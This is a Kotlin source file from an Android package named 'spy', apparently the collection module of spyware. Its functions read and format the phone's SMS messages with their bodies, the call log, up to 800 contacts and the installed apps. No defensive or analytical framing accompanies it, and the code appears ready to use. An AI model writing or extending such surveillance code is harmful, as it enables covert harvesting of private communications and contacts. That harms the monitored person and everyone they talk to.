package com.you.spy.collect

import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object Collectors {

    private val df = SimpleDateFormat("dd MMM HH:mm", Locale.US)

    private fun ts(millis: Long) = df.format(Date(millis))

    fun sms(ctx: Context, limit: Int): String {
        val sb = StringBuilder()
        val proj = arrayOf(
            Telephony.Sms.ADDRESS, Telephony.Sms.BODY,
            Telephony.Sms.DATE, Telephony.Sms.TYPE
        )
        ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI, proj, null, null, "date DESC"
        )?.use { c ->
            var n = 0
            while (c.moveToNext() && n < limit) {
                val dir = if (c.getInt(3) == Telephony.Sms.MESSAGE_TYPE_INBOX) "<<" else ">>"
                sb.appendLine("${ts(c.getLong(2))} $dir ${c.getString(0)}")
                sb.appendLine("  ${c.getString(1)}")
                n++
            }
        }
        return sb.toString().ifEmpty { "no sms" }
    }

    fun calls(ctx: Context, limit: Int): String {
        val sb = StringBuilder()
        val proj = arrayOf(
            CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
            CallLog.Calls.DATE, CallLog.Calls.DURATION
        )
        ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI, proj, null, null, "date DESC"
        )?.use { c ->
            var n = 0
            while (c.moveToNext() && n < limit) {
                val type = when (c.getInt(1)) {
                    CallLog.Calls.INCOMING_TYPE -> "IN"
                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    else -> "?"
                }
                sb.appendLine("${ts(c.getLong(2))} $type ${c.getString(0)} (${c.getLong(3)}s)")
                n++
            }
        }
        return sb.toString().ifEmpty { "no calls" }
    }

    fun contacts(ctx: Context): String {
        val sb = StringBuilder()
        ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ), null, null, "display_name ASC"
        )?.use { c ->
            var n = 0
            while (c.moveToNext() && n < 800) {
                sb.appendLine("${c.getString(0)}: ${c.getString(1)}")
                n++
            }
        }
        return sb.toString().ifEmpty { "no contacts" }
    }

    fun apps(ctx: Context, system: Boolean): String {
        val pm = ctx.packageManager
        val list = pm.getInstalledApplications(0)
            .filter { system || (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
            .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
        return list.joinToString("\n") {
            "${pm.getApplicationLabel(it)} [${it.packageName}]"
        }.ifEmpty { "none" }
    }
}
